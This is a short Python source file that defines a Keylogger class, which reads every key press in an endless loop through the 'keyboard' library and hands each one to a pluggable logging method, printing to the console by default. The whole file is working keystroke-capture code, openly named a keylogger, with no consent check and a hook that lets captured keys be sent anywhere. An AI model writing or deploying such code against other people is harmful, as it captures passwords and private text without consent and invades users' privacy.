import keyboard

class Keylogger:
    def __init__(self, logMethod=None):
        # initialises logging method
        self.logMethod = logMethod or self.printToConsole

    # runs the keylogger
    def run(self):
        for key in self.getKeystroke():
            self.logMethod(key)

    # gets the keystrokes
    def getKeystroke(self):
        while True:
            yield keyboard.read_key()

    # defaults to printing if no logging method is provided
    def printToConsole(self, key):
        print(key)
